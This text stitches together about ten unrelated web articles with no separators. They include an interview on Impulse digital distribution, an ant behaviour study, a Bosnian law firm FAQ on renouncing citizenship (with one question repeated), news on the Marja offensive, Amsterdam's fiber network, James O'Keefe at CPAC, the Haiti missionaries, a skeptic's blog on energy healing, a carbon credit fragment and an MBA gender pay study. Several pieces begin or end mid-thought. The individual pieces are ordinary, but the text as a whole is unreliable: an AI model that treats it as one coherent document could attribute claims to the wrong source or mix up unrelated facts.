Valve had huge growth last year and we had huge growth , and I imagine Direct2 Drive had huge growth , but is that what they ’re basing that on ?
RPS : Well , if I recall correctly , they do suggest that the figure encompasses software sold digitally and at retail globally , as researched by some data company .
There must be some guesswork in there .
Wardell : Ha !
Well I happen to know that the big distributors are making $ 65 trillion a week !
See , I can make up numbers too .
RPS : Okay , but you have to hope that this is an informed report and not just hot air .
And the digital games sales frontier does seem to be growing rapidly .
Talking to the C&C4 guy on Monday , he was saying how he ’d picked up The Witcher because he ’d seen it on Steam .
That ’s going to start happening more and more as people get used to browsing and buying digitally .
It ’s awesome for PC gaming generally , because it ’s a mini-revolution in throwing off the dependence on retail .
The Steam sales alone are generating crazy cash .
Wardell :
Most of our revenue still comes from retail , but having digital as an option has changed the relationship enormously .
They used to have us by the – uh – balls , essentially , and having your business completely dependent on a handful of buyers is not okay .
What it used to be like in the United States was that one store pretty much controlled all of sales of software , and they would only buy from a handful of distributors .
Maybe your software would get bought , maybe it would get shipped , maybe you would get paid .
We ’ve not been paid retail revenues for software because there were so many entities between us and the consumer .
Digital streamlines that , and it ’s good .
RPS : And it ’s not just better for companies , it ’s better for gamers who want to spend their money on more obscure stuff , more esoteric stuff , more complex stuff …
Wardell : Sure , the strange thing is almost that it has taken so long to happen on PC .
I mean look at the iPhone apps store .
A few of those guys are now making millions of dollars on their $ 5 apps , and they ’re not hurting by not being at retail .
All the matters is that it ’s a clean , easy buying experience .
And that ’s what Impulse and Steam do .
It ’s streamlined .
It ’s easy .
RPS : So just to sum up : all this Impulse Reactor stuff is hitting in the summer ?
Wardell :
Well some of our partners have it now so that we can beta test , but in terms of making it available to indies and so on , yes , it ’ll be later in the summer .
That ’s tied to how we ’re doing the multiplayer for Elemental , too .
For example , when you play most traditional RTS games you are talking to each other online , and that ’s great until someone has a bad connection or something .
With Starcraft II what Blizzard have done is to create a gazillion servers and then throws you onto a server with the other people .
That ’s why there ’s no talk about port - forwarding or anything like that , and that ’s possible because of the kind of thing we ’re doing with Impulse Reactor .
We ’re just going to connect users on the most local machine to them .
And it ’s only in the last couple of years that virtual machines have become common .
I can put dozens of virtual machines on one server machine , and just a few years ago you could n’t do that .
It ’s a major change .
Elemental will be our full showcase of all this stuff .
RPS : And we ’ll talk about that tomorrow .

Ant Temnothorax unifasciatus .

( PhysOrg.com ) --
Scientists studying ants have discovered that when they are seriously ill they voluntarily go away from the nest to die , which reduces the chances of them passing their infection to nest mates .
Scientists Jurgen Heinze and Bartosz Walter , from the University of Regensburg , Germany were interested in reports in ants , cats , dogs , elephants , and occasionally in humans , that some dying individuals would leave their homes to die away from their companions .
Since the phenomenon happens only occasionally , it is difficult to study quantitatively .
Heinze and Walter reared a colony of ants ( Temnothorax unifasciatus ) in the laboratory , and then exposed them to spores of a parasitic fungus ( Metarhizium anisopliae ) that kills ants .
They discovered that most infected worker ants deserted the nest in the hours or even days before they died and made their way to a distant foraging area , where they died alone , away from the other workers .
They left voluntarily , and were not forcibly removed by other worker ants .
It is known that fungi can manipulate behavior .
For example , ants infected by a cordyceps fungus will climb to the top of a stem , rather like zombies , and will die there , allowing the fungus spores leaving the body to spread more widely from the higher vantage point .
To eliminate this possibility , the researchers exposed other ants to 95 % CO 2 , which considerably reduces their life expectancy .
They found that affected ants also left the nest to die , even though they had not been infected by the fungus .
In observing ant colonies , they also saw the same behavior in ants dying from unknown causes .
This shows that ants actively removed themselves from the nest voluntarily and broke off social interactions with the other ants regardless of the cause of their imminent death .
The act of removing themselves from the nest when death seems imminent may reduce the chance of infection spreading to other ants .
Similar behaviors are seen in other social insects .
The bumblebee , for example , is also known to leave the hive when it is infected by fly larvae , but in this case the bee is moving into a colder temperature , which would reduce the lifespan of the larvae and might save its own life , as well as lowering the chance of infection to other members of the hive .
The findings of the study are reported in the journal Current Biology .

Procedura odricanja od državljanstva BiH « Oblasti rada advokatske kancelarije Nakon skoro tri desetlje ća advokatske prakse naše advokatske kancelarije u oblasti državljanstva , koja bliže podrazumjeva : odricanje od državljanstva Bosne i Hercegovine , sticanje državljanstva Bosne i Hercegovine , reviziju državljanstva BiH , naknadnog upisa u matične knjige , povrat BiH državljanstva , propise iz oblasti ličnog imena , matičnih knjiga , putnih isprava , priznanja stranih sudskih odluka o razvodu braka te stutisnim pitanjima i drugih osnovnih građanskih stanja donosimo najčeš ća pitanja naših klijenata i odgovore na njih .
Oblast koja uređuje državljanstvo i matičnih knjiga u Bosni i Hercegovini je regulisana kroz 90 pravni izvor koji uključuje Konvencije , Zakone , podzakonskih akata , pravilnika , Uredbe i druge propisa na državnom i entitetskom nivou Bosne i Hercegovine .
Pitanja smo poredali od onih najčešće postavljenih do manje čestih , pa da krenemo :
Pitanje : Da li postoji mogućnost bez mog dolaska u Bosnu i Hercegovinu da Vi kao moj advokat , za mene prijavite brak , regulišete prezime , pripremite sve dokumente u Bosni i Hercegovini i završite proceduru odricanja od BiH državljanstva ?
ADVOKAT : Vaš dolazak u Bosnu i Hercegovinu nije potreban .
Sve možemo uraditi za Vas kao vaši advokati , a na osnovu punomoćja kojeg ćete dobiti od nas i istu ovjeravate pred notarom u inostranstvu .
Pitanje : Šta mi je potrebno da bi se mogao odreći državljanstva Bosne i Hercegovine ?
Odgovor : Prvo i najvažnije jeste da imate garanciju za sticanje državljanstva strane države ili dokaz da ste već stekli strano državljanstvo i potvrdu o stalnom prebivalištu u konkretnoj državi .
Pitanje :
Ne posjedujem važeći pasoš Bosne i Hercegovine , da li se može raditi procedura ispis iz državljanstva BiH bez pasoša Bosne i Hercegovine ?
Odgovor : Procedura odricanja od državljanstva Bosne i Hercegovine se može raditi bez važeće putne isprave Bosne i Hercegovine .
Pitanje :
Ne posjedujem ličnu kartu Bosne i Hercegovine , da li se može raditi procedura ispisa iz bosanskog državljanstva bez važeće lične karte BiH ?
Advokat : Procedura odricanja od državljanstva Bosne i Hercegovine se može raditi bez važeće lične karte BiH ; potrebno je uvjerenje o nadležnog MUP - a o neposjedovanju lične karte BiH .
Pitanje : Ukoliko se odreknem državljanstva Bosne i Hercegovine , da li mogu da naslijedim imovinu nakom smrti mojih roditelja ?
Odgovor : Strani državljani su izjednačeni sa domaćim državljanima u pogledu nasljedstva .
Dakle
Vi možete da naslijedite imovinu bez ograničenja kao strani državljanin , a po završetku procedure odricanja od bosanskog državljanstva .
Pitanje : Ukoliko mi prestane državljanstvo Bosne i Hercegovinei steknem državljanstvo Njemačke / Austrije , da li ja mogu u Bosni i Hercegovini da kupim nekretninu ili da mi neko pokloni nekretninu npr kuću , vikendicu , stan ?
Odgovor : Kao državljanin SR Njemačke /
Austrije , možete bez ograničenja da stičete vlasništvo nad nekretninama u Bosni i Hercegovini – vrijedi princip reciprociteta ; dakle niste limitirani sa procedurom ispisa iz državljanstva BiH .
Pitanje : Moja majka i otac su bili državljani BiH u trenutku mog rođenja , međutim ja nisam upisana u Bosni i Hercegovini niti u knjizi rođenih niti knjizi državljana BiH , da li možete za mene da izvadite potvrdu da nisam državljanin Bosne i Hercegovine ?
Odgovor : Potvrda da niste državljanin BiH se ne može izdati na državnom nivou jer u BiH ne postoji nadležni državni organ koji vodi evidenciju državljana BIH na nivou države .
Moguće je dobiti uvjerenje u lokalnom matičnim uredu gdje se vode Vaši roditelji da Vi nemate državljansvo Bosne i Hercegovine , ali je posebno bitno da znate da Vi po Zakonu o državljanstvu BiH imate pravo na državljanstvo BiH na osnovu roditeljima , i da će od Vas vlasti u inostranstvu tražiti da se naknadno upišete u knjigu državljana BiH i knjigu rođenih , a zatim obavite proceduru odricanja od BiH državljanstva .
Pitanje : Proceduru ispisa iz bosanskog državljanstva bi radili moj suprug , ja i naše dvoje maloljetne djece .
Koliko mi plaćamo taksi državi BiH , da li 4 posebne takse ili jednu taksu ?
Odgovor : Vi plaćate kao porodica ukupno jednu jedinstvenu administrativnu taksu , s obzirom da živite na istoj adresi i da su djeca maloljetna ; u postupku odricanja od bosanskog državljanstva .
Pitanje : Cijena administrativne takse za državu Bosnu i Hercegovinu iznosi cca 425 , - EUR u proceduri odricanja od državljanstva BiH za porodicu , recite nam da li je porodica brat i sestra ako rade proceduru bez roditelja ?
Odgovor : Prema zakonu za članove uže porodice - bračni par i djeca , plaća se jedna taksa pod uslovom da svi žive na istoj adresi , a za punoljetnu djecu preko 23 godine starosti potrebno je dostaviti dokaze da su nezaposleni ili na redovnom školovanju .
Dakle brat i sestra ispunjavaju uslove da plate jednu administrativnu taksu samo pod uslovom da sa njima proceduru radi bar jedan od roditelja i da su mlađi od 23 godine te svi skupa žive na istoj adresi u inostranstvu .
Pitanje : Živim u Njemačkoj / Austriji , pored garancije za sticanje državljanstva Njemačke / Austrije , posjedujem i državljanstvo Hrvatske , s obzirom da je administrativna taksa za odricanje od državljanstva Bosne i Hercegovine , a radi posjedovanja državljanstva Hrvatske samo 110 EUR - a da li ja mogu raditi ovu proceduru na taj način ?
Odgovor : Samo pod uslovom da ste i dalje prijavljeni sa adresom prebivališta u Hrvatskoj – potrebno je napomenuti da je u Hrvatskoj stupio novi Zakon o prebivalištu od 01.01.2013.g.
koji nalaže da lica koja zaista ne žive na adresi u Hrvatskoj su dužna da se odjave sa adrese ( jedno fizičko lice jedna adresa u EU ) .
Pitanje : Punoljetan sam , dobio sam u inostranstvu garanciju da će mi državljanstvo biti dodijeljeno nakon što se odreknem od državljanstva Bosne i Hercegovine , međutim ja i nemam državljanstvo BiH .
Moja mama je državljanin BiH , tata mi je stranac , nisam rođen u BiH , kako je moguće da od mene zahtijevaju odricanje od BiH državljanstva kojeg nemam ?
Odgovor : Prema Zakonu o državljanstvu BiH , član 6 ( sticanje državljanstva BiH porijeklom ) , stav 4 navodi : „ Ako je rođeno u inostranstvu , a čiji je jedan roditelj bio državljanin BiH u vrijeme djetetovog rođenja , pod uslovom da do vremena kada navrši 23 godine podnese prijavu za evidentiranje državljanstva BiH nadle žnom organu . “
Dakle u konkretnom slučaju Vi imate pravo na državljanstvo BiH u skladu sa Zakonima BiH , potrebno je da izvršite upise u knjigu državljana BiH , zatim knjigu rođenih BiH , kako bi zatim nakon svih postupak proveli proceduru odricanja od državljanstva BiH .
Pitanje : Da li mogu da vratim državljanstvo Bosne i Hercegovine , nakon ispisa iz BiH državljanstva ?
Odgovor : Lice kojem je državljanstvo BiH , radi sticanja ili zadr žavanja državljanstva druge države , prestalo odricanjem ili otpustom , može podnijeti zahtjev za ponovno sticanje državljanstva BiH , ako ispunjava uslove iz člana 9 . , osim uslova iz stava 1 . tač .
1 . i 2.. , samo ako ima odobren privremeni boravak najmanje posljednju godinu na teritoriji BiH ili odobren stalni boravak .
Međutim budići da Bosne i Hercegovina ima ugovor o dvojom državljanstvu samo sa tri države , morate sačekati da BiH postane članica EU – jer samo u tom slučaju većina država odobrava dvojno državljanstvo ( među kojima nije Austrija – naime Austrija ne dopušta dvojno državljanstvo niti sa državama članicama EU ) .
Pitanje : Kako se dokazuje državljanstvo Bosne i Hercegovine ?
Odgovor : Državljanstvo BiH i državljanstvo entiteta se dokazuje uvjerenjem o državljanstvu BiH i uvjerenjem o državljanstvu entiteta ili pasošem Bosne i Hercegovine .
Pitanje : Ko donosi odluke o sticanju državljanstva Bosne i Hercegovine ili odricanju od državljanstva ?
Advokat : Odluke o sticanju ili prestanku bosanskohercegovačkog državljanstva donosi Ministarstvo civilnih poslova Bosne i Hercegovine Sarajevo .
Molba za sticanje , otpust ili odricanje iz državljanstva BiH mora se neposredno podnijeti Ministarstvu civilnih poslova BiH .
Pitanje : Koliko košta ispis iz bosanskog državljanstva – administrativna taksa , ako proceduru prvo radi muž i sin , a nakon pola godine majka i kćerka ( nemamo svi garanciju u istom trenutku ) ?
Odgovor advokata : U toku jedne kalendarske godine , jedna porodica plaća jednu administrativnu taksu .
Dakle ako se Vaša porodica odriče od bosanskog državljanstva u istoj kalendarskoj godini ukupno će biti jedna administrativna taksa .
Pitanje : Da li punomoć koju ste nam dosatavili a za proceduru odricanja od državljanstva Bosne i Hercegovne možemo da ovjerim pred Ambasadom Bosne i Hercegovine / Konzulatom Bosne i Hercegovine u inostranstvu ?
Odgovor : Punomoć možete ovjeriti pred Konzulatom BiH / Ambasadom BiH – ukoliko Vam je blizu , ukoliko nije možete pred najbližim notarom u inostranstvu .
Pitanje : Nakon što Vama predam svu dokumentaciju koja je neophodna za proceduru odricanja bosanskog državljanstva da li mogu da zadržim pasoš
BiH jer mi je potreban za putovanje ?
Advokat : Pasoš BiH možete koristiti sve dok je kod Vas u posjedu , i nije smetnja da za Vas uredno pokrenemo postupak odricanja od državljanstva Bosne i Hercegovine , ali nam je paso š
BiH u orginalu ukoliko isti posjedujete potreban da bi mogli završiti proceduru ; jer se isti polaže u orginalu prilikom dizanja rješenja o prestanku državljanstva BiH .
Pitanje : Nakon što Vama predam svu dokumentaciju koja je neophodna za proceduru odricanja bosanskog državljanstva da li mogu da zadržim pasoš
BiH jer mi je potreban za putovanje ?
Odgovor : Pasoš BiH možete koristiti sve dok je kod Vas u posjedu , i nije smetnja da za Vas uredno pokrenemo postupak odricanja od državljanstva Bosne i Hercegovine , ali nam je paso š
BiH u orginalu ukoliko isti posjedujete potreban da bi mogli završiti proceduru ; jer se isti polaže u orginalu prilikom dizanja rješenja o prestanku državljanstva BiH .
Pitanje : Odrekao sam se državljanstva BiH da bih stekao državljanstvo Hrvatske jer su to od mene zahtjevali garancijom za sticanje državljanstva , da li je moguće da vratim BiH državljanstvo ?
Advokat : Da , moguće je da vratite BiH državljanstvo , jer BiH i Hrvatska imaju Ugovor o dvojnom državljanstvu .

The assault came as a surprise to no one .
American commanders and Afghan officials have said publicly for weeks that an invasion of Marja was imminent , in an effort to chase away as many Taliban fighters as possible and keep the fighting , and civilian casualties , to a minimum .
The hope is to win the support of local residents , even at the expense of letting Taliban get away .
Indeed , the American and Afghan troops moving into the city are setting for themselves a very high  and possibly difficult standard .
They have urged the Afghans to stay in their homes rather than flee the city .
But that could make it difficult to avoid killing at least some noncombatants .
“ The message for the Taliban is :
It will be easy , or it will be hard , but we are coming , ” Brig .
Gen. Larry Nicholson , the commander of the United States Marines in Helmand Province , told the men of Company K before the operation began .
“ At the end of the day , the Afghan flag will be over Marja . ”
The American and Afghan strategy of broadcasting their intentions seems to have worked so far .
Hundreds of Taliban fighters are believed to have the fled Marja in recent weeks , including many commanders  a sign that the Taliban ’s leaders , who are believed to be based in the sprawling Pakistani city of Quetta  have decided that Marja will be lost .
“ We know a bunch of them left , ” a senior NATO commander said , speaking on the condition of anonymity because of the delicacy of the operation .
Last week , Afghan intelligence agents captured the Taliban ’s “ shadow governor ” after he had fled Marja on the orders of his commanders in Pakistan , NATO officials said .
The governor , whose name was not disclosed , was spotted by Afghan officials as he drove through Kandahar , probably on his way out of the country , officials said .
The capture of the local Taliban chief is the latest in a number of “ shadow governors ” who have been killed or captured in recent weeks by Afghan or American forces .
Despite their titles , the Taliban “ governors ” often serve as the overall military commanders in an area , as well as taking charge of some civilian duties .
The city of Amsterdam has been involved for several years in building Citynet , a partnership between the city and two private investors to wire 40,000 Amsterdam buildings with fiber .
And it 's not just fiber , it 's open access fiber — any ISP can sign up to use the infrastructure and deliver ultra-fast Internet access .
In 2008 , the European Union ruled that the city 's involvement in the project was in fact legal , and that it was not improperly interfering in the market .
We asked Herman Wagter , CEO of the company that built the Citynet fiber project , to talk about how he got the job done , and to explain the challenges of rolling out fiber in a densely crowded European city .
Theory versus practice
First , a few basic problems .
Unlike in the US and Japan , stringing fiber along poles is not an option in European capitals .
Every fiber cable must be buried below the pavement , then distributed inside a building to apartments ; no wires can be exposed on the outside .
The density of these old cities is quite high , and real estate is expensive , leaving little room for cabinets with active equipment on the street level .
The majority of the housing consists of multi-dwelling - units ( MDUs ) with up to 500 individual apartments per building , but one can find the occasional houseboat on a canal as well .
When the design of the Amsterdam fiber network started in 2005 , it became clear that there was little experience in the market with this type of deployment .
Contractors were used to either putting copper wires or coax lines in new buildings , or digging long stretches of big high density polyethylene ( HDPE ) tubes for backhaul purposes .
Most fiber packaging was optimized for backhaul and for metro networks ; few products were specifically designed for fiber - to - the - home ( FTTH ) in these conditions .
Fortunately , most vendors , like Draka , who delivered the fiber in Amsterdam were able to react quickly and rise to the occasion when challenged with specific requirements for the city .
The experience in Amsterdam and other European cities has resulted over the years in products like miniature direct burial cables , special high - rise cables with break - out windows to allow very fast builds inside MDUs , fibers that can bend sharply , easy - install Fiber Termination Units ( FTUs ) inside apartments , and so on .
The learning curve for everyone involved was immense .
Only now , after five years , is it tapering off , giving everyone a chance to catch their breath .
Here 's what we learned from the last half - decade of fiber installs in Amsterdam .
Architecture
Deploying buried cables to every apartment in a dense city is a disruptive process .
You do not want to repeat it for decades — preferably longer — so it needs to be done right .
A point - to - point fiber topology runs individual fibers from each apartment back to the local aggregation point ( think of the phone system model ) ; it 's the most flexible and future - proof topology .
Point - to - point will support all known technologies ( GPON , active Ethernet , lambda , RF video overlay , and others ) by patching individual fibers in the aggregation point .
It allows for easy unbundling of individual lines , a feature much appreciated by regulators and customers in Europe .
The alternative topology , PON , features a shared fiber for each 32 to 64 customers .
This saves on fiber runs and reduces the number of connectors and the size of the local point of presence gear , but it has one big architectural drawback : more path dependencies .
Finally , it is difficult to unbundle a PON topology .
The length of fiber needed to cover the distance from a point of presence ( called an aggregation point with active equipment , or APOP ) to an apartment is a few kilometers at most , so the cost of the actual fiber is only a small part of the total investment ( less than 10 percent ) .
Handling that many fibers in a point - to - point topology may seem like a problem until the comparison is made with the old equivalent : 100 - year old copper cabling for the phone system .
Those copper cables are much more bulky than the equivalent fiber cables ; in fact , they are four times fatter .
Yet we have been able to manage a huge number of copper cables for ages without a problem , so a much slimmer fiber plant should not pose a problem , even when every apartment gets its own line .
So we decided to go for point - to - point in Amsterdam : it did ( and does ) not make sense to be “ penny wise and pound foolish , ” by saving on fiber upfront but running the risk of having to redo the outside fiber plant in a decade or two .
Paying a slightly higher cost ( estimated at 5 percent or less of the total CAPEX budget for the project ) for more fiber length and more connectors / patches was considered an acceptable insurance premium against potential premature technical obsolescence .
( In case of Citynet , a second fiber specifically for RF - video was deployed as well , as a shared fiber with optical splitters .
In the next build - outs this will be modified to a second point - to - point fiber , as the limitations of a shared fiber became obvious . )
The second decision was to build an open - access , passive fiber plant that would support multiple ISPs in competition .
In practice this translates to :
Unbundled dark fiber access lines which can be rented individually by an ISP who wants to serve that particular customer
ISPs can get access to APOPs to install their line cards and related equipment , patch in their customer access line , and connect to their own backhaul network
To prevent a clutter of patch cords in the APOP , the patching is limited per group of connections ( 1,500 to 3,000 ) .
If an ISP wants to service a customer within the group , it has to place equipment within the group patch area .
A group of 1,500 to 3,000 patches to a limited number of ISPs can be de-cluttered within a reasonable amount of time if the need should arise .
James O'Keefe got a rock star welcome at the annual Conservative Political Action Conference Thursday .
O'Keefe says next video ' ready to go '
James O’Keefe , the self - styled guerilla investigative journalist celebrated for his video on ACORN and arrested last month in New Orleans in an attempted expose of Democratic Sen .
Mary Landrieu , got a rock star welcome at the annual Conservative Political Action Conference Thursday .
O’Keefe , 25 , was n’t scheduled to do any official events at CPAC , as the conference is known , but he attracted plenty of attention as he waded through the lobby of the Marriott Wardman Park Hotel in Washington , where the conference is taking place , posing for pictures with admiring fans who wished him well in his pending court case .

O’Keefe became a instant conservative celebrity last year when he and a partner , Hannah Giles , released secretly recorded videos of them posing as a pimp and prostitute while soliciting advice from employees of ACORN , the liberal community organizing group , on how to set up a brothel .
But last month , after he and two other men entered Landrieu ’s New Orleans district office pretending to be telephone repairmen , while a fourth man waited outside , they were arrested by the U.S. Marshals Service and charged with entering federal property under false pretenses with the intent of committing a felony , charges that carry maximum penalties of 10 years in prison and $ 250,000 in fines .
According to an FBI affidavit , two of the men attempted to manipulate telephones and accessed the telephone closet , while O’Keefe filmed them on his cell phone camera .
Their supporters say their goal was to show that staffers for Landrieu , who became a target of conservative scorn for voting for the Senate healthcare overhaul after being promised additional Medicaid funding for her state , was ignoring constituent phone calls .
In a short interview in a hotel hallway , O’Keefe told POLITICO he had another investigative video “ ready to go , ” though he would n’t reveal the topic or the timing .
“ I ’m always ready to go , ” he said .
The ACORN videos , which resulted in a Congressional vote to stop federal funding for the group before a federal judge ordered the funding restored , will be recognized Friday evening with an award from XPAC , the acronym for “ Xtremely Active Political Conservatives , ” which is holding its own events at the conference .
O’Keefe – who had to get permission from authorities to attend CPAC – told POLITICO he was n’t sure if the terms of his pre-trial release would allow him to remain in Washington to accept the award or would require him to return to his parents ’ home in New Jersey .
O’Keefe flashed his pre-trial papers from the federal district court hearing his case – as did Joe Basel , 24 , one of the three other activists arrested with him in New Orleans – as conference - goers walked by gawking and offering encouragement .
“ Good job , bud , ” said one elderly man , who shook O’Keefe ’s hand .
“ Hang in there . ”
“ It ’s like ( the attendees ) saw Chuck Norris , ” said Basel , who confessed fewer CPACers recognized him .
“ These are n’t my people , ” he explained .
O’Keefe blasted mainstream media outlets for falsely reporting that he and his crew had been arrested for attempting to wiretap the phones in Landrieu ’s district office , and he boasted that The Washington Post had to run two corrections for mischaracterizing the case .
“ They hate me because I ’m effective , ” he said .
He briefly defended his undercover tactics , asserting reporters can learn more if they did n’t identify themselves as such , and urging this POLITICO reporter to try that approach , before begging off a longer , more formal interview .
O’Keefe explained that he intends to limit his media exposure to heighten anticipation for his forthcoming video .
“ I ’m not a pundit , ” he said , before retreating into an elevator with Giles , Basel and a third man .
Andrew Breitbart , whose Big Government website posted O’Keefe ’s ACORN videos , predicted that O’Keefe , Basel and their colleagues would be absolved in the New Orleans case and that when the truth comes out it would leave their critics “ with egg on their face . ”
He alleged that left - leaning media personalities including MSNBC ’s Rachel Maddow , who made a brief appearance at CPAC , tried to vilify O’Keefe and his cohorts , but said attacks will only make them more effective .
“ When they do that to a Joe Basel or a Hannah Giles , or a James O’Keefe , it only weaponizes them , ” Breitbart told POLITICO .
“ And that ’s the reason they have a smile on their face - they know that they now have a platform .
They ’re not shying away from their notoriety here , ” he said , as woman approached him to thank him for “ sticking up for James . ”
Breitbart said he continues to work with O’Keefe and intends to post his next video project , but said he only met Basel and a third person who was arrested in New Orleans , 24 - year - old Stan Dai , at a Wednesday night party hosted by former House Majority Leader Dick Armey ’s FreedomWorks PAC .
“ I love meeting troublemakers , ” Breitbart said , adding he was impressed by Basel and Dai , and intends to use CPAC to scout for more young people interested in activist journalism .
“ My business model is I want to be a talent scout .
I want to be an American idol for weaponized freedom fighters , ” said Breitbart .
“ And that ’s one of the reasons I love coming here . ”
CORRECTION : This story was altered to reflect that O'Keefe and Basel are on pre-trial release , not probation or parole , as was stated in an earlier version .
A Haitian judge has decided to release 10 US missionaries accused of kidnapping 33 children and trying to spirit them out of the earthquake - stricken country .
A judicial source said the missionaries , who have been in jail since they were stopped at Haiti 's border with the Dominican Republic on January 29 , could be released as early as Thursday .
" The order will be to release them , " said the source , who asked not to be named .
" One thing an investigating judge seeks in a criminal investigation is criminal intentions on the part of the people involved and there is nothing that shows that criminal intention on the part of the Americans . "
The decision has not yet been made public .
The missionaries , most of whom belong to an Idaho - based Baptist church , were arrested trying to take the children across the border to the Dominican Republic 17 days after an earthquake that killed more than 200,000 people in the impoverished Caribbean nation .
The five men and five women have denied any intentional wrongdoing and said they were only trying to help orphans left destitute by the quake , which shattered the Haitian capital and left more than 1 million homeless .
But evidence has come to light showing most of the children still had living parents .
As part of Haiti 's legal requirements , investigating Judge Bernard Sainvil must send a notice of his decision to the prosecutor .
That will be done on Thursday , the source said .
Once he receives the order , the prosecutor could offer an opinion that one or more of the Americans should be held but that would have no legal effect on the judge 's decision .
The case has been a distraction to the Haitian government as it tries to cope with the aftermath of the earthquake and has been diplomatically sensitive for the United States as it spearheads a massive international effort to feed and shelter quake survivors .
Haiti's beleaguered government had warned that unscrupulous traffickers could try to take advantage of the chaos that followed the quake by taking away vulnerable children , and it tightened adoption procedures .

I had an interesting conversation with a reporter today .
She called me to get a “ medical / skeptical ” counterpoint for an article she is preparing on energy healing .
Although I do n’t know if she ’ll faithfully represent what I had to say , we had an entertaining exchange and so I decided to capture the essence of it here .
I ’m curious to see which parts of our conversation remain in her final article , due out on February 19th .
( Stay tuned for that ) .
Apparently a local hospital in Maryland is now offering nurse - guided therapeutic touch and Reiki healing for inpatients .
She decided to interview the practitioners involved , and turned to me for comment .
I did not have the benefit of preparing in advance or having references handy – so I gave it my best shot .
I ’d be interested to know how you might have responded differently .
1 . Is there any scientific evidence that energy healing works ?
No .
There is currently no conclusive evidence that energy healing is more effective than placebo .
Furthermore , there ’s no known mechanism whereby an unmeasurable energy could be manipulated to improve one ’s health .
Such ideas hearken back to a point in history when we did n’t understand the pathophysiology of disease .
Hundreds of years ago we had no idea about bacteria , viruses , and the genetics of cancer for example .
We did the best guess work we could – and chalked up diseases to mysterious energy imbalances .
But thanks to scientific inquiry , we now know a lot more about the true causes of disease .
2 . Why do patients turn to “ alternative medicine ” modalities like energy healing ?
In my view , there are two things that drive people to try alternative medicine : 1 ) They are not satisfied with their current medical treatment – either because there is no cure or sufficient palliation for their disease / condition , or they may have been misdiagnosed , or their emotional needs have not been adequately addressed and 2 ) People want to feel in control of their health .
Unfortunately , the human death rate is still 100 % , no matter how hard we try to cheat it .
There comes a time when each of us will be very unhappy with our “ health outcome . ”
I also think that our fragmented healthcare system ( with all its perverse incentives ) results in a high degree of frustration , access problems , and insufficient time actually getting to the bottom of diagnostic conundrums .
Best Doctors estimates that up to 20 % of patients have been given the wrong medical diagnosis – probably because the patients were rushed through a busy office without their medical history ( and all the tests and medical records ) being adequately reviewed .
Our broken system sets people up to look further for solutions – and sometimes the path of least resistance is to pay an alternative medicine practitioner to hear your case .
3 . Do you think CAM is popular ?
It depends on how you define CAM .
If you take the broadest definition of it ( and include vitamins and prayer as types of CAM ) then , yes , most people have tried it .
But if you ’re asking how many Americans regularly use Reiki , Reflexology , or healing touch , the number is probably less than 1 % .
While it ’s true that more and more academic institutions are setting up “ integrative medicine centers ” to incorporate CAM into scientific medical practices , I ’m also seeing a growing number of skeptics online and in mainstream media .
Newsweek took Oprah to task for her steady parade of TV pseudoscience , Amy Wallace exposed the anti-vaccine movement at Wired Magazine , Dave Whelan is doing some quackery exposes at Forbes , and AP ’s Marilynn Marchione has taken on false cancer cures .
Even Washington is showing a hint of skepticism – with John McCain ’s new bill essentially seeking to bring supplements back under some degree of control by the FDA .
4 . Do you think that CAM practitioners are intentionally dishonest and selling their therapies for profit ?
Some may be that way , but the majority probably really believe in what they ’re doing .
There is a tendency for CAM practitioners to support their beliefs with anecdotes , though .
They believe that their treatments “ work ” because they ’ve witnessed patients getting better .
Of course , a certain percentage of patients will always get better on their own .
I also think that there ’s great value in “ talk therapy ” – discussing an illness with a empathic listener can reduce anxiety and make a person feel better .
CAM practitioners spend a lot of time listening and expressing empathy – which is probably their secret to success ( not the “ magical ” properties of energy healing ) .
Remember that placebos have effects , and are especially good at modulating the perception of pain or emotional disturbances .
I have no doubt that many CAM therapies have placebo effects .
5 . What do you think of reflexology ?
The idea that body parts and organ systems can be influenced by applying pressure to the feet is part of an old fashioned system of thinking .
There is no “ humunculus ” on the feet ( or ears for that matter ) and we have proven that with modern brain imaging .
Reflexology was created before we understood how the nervous system works or the complex pathophysiology of disease .
But foot massage does feel good , so I can see why some people might be drawn to reflexology as a proxy for a good foot massage .
6 . What do you think of healing touch in hospitals ?
I ’m not a fan .
I think it ’s misleading to patients – to use the credibility and trust of the hospital ’s “ brand ” to make patients think that they ’re receiving a scientifically - proven therapy .
There ’s no conclusive evidence that touching patients makes a difference in most disease outcomes – and I would wager that blocking off time for nurses to engage in compassionate dialog with patients would have a similar positive emotional effect .
Why the pretense that something scientific is happening ?
Let ’s just make time for normal caring gestures and some good talk therapy .
7 . What about yoga and Pilates ?
There ’s no doubt that exercise – in pretty much any form – is good for the body .
Stretching exercises are a valuable part of physical fitness , and core strengthening can reduce the chance of low back injuries for example .
I think that yoga and Pilates – and Tai Chi or bowling for that matter – all have a roll in healthy activity levels .
These kind of low impact exercises are particularly good for the elderly , and can help to keep the mind active as well .
If it then emerged , however , that a hidden agenda of the scheme to preserve this chunk of the forest was to allow the WWF and its partners to share the selling of carbon credits worth $ 60 billion , to enable firms in the industrial world to carry on emitting CO2 just as before , more than a few eyebrows might be raised .
The idea is that credits representing the CO2 locked into this particular area of jungle – so remote that it is not under any threat – should be sold on the international market , allowing thousands of companies in the developed world to buy their way out of having to restrict their carbon emissions .
The net effect would simply be to make the WWF and its partners much richer while making no contribution to lowering overall CO2 emissions .

Thinking about getting an M.B.A.?
While advanced degrees are often touted as the way to improve salary and access to top jobs , researchers have discovered that simply being male translates to more money and opportunity .

The research was released on Thursday by Catalyst , a leading nonprofit focusing on improving gender diversity in the workplace .
The Wall Street Journal summarizes the key findings of the study :
The study , which had more than 9,000 respondents who graduated from 26 M.B.A. programs between 1996 and 2007 , found that starting from the first job post - M.B.A. women lagged behind male respondents .
For example , 60 % of women respondents reported that their first job was at an entry level position , as opposed to 46 % of male respondents .
Women also earned an average $ 4,600 less than men in their first job , even if they had the same amount of previous work experience , the study found .

The researchers over at Catalyst know their subject matter in and out - within the report is a rebuttal to common assertions when this type of data surfaces .
* It 's not a matter of different aspirations .
The findings hold even when considering only men and women who aspired to CEO / senior executive level .
* It 's not a matter of parenthood .
The findings hold even when considering only men and women who did not have children .
* Even after taking into account the starting level of their first post - MBA job , first post - MBA job salary , job level at the time of the survey , number of years of experience , time since MBA , and industry and global region where they worked at the time of survey , men 's salary growth outpaced women's .

Terming the problem " a wake up call , " the authors of the study ultimately conclude the the pipeline for women to go from college to the top levels of an organization is ultimately flawed .
Luckily for corporations interested in increasing the number of women in high ranking positions , the report is peppered with commentary from men and women currently in the executive suite .
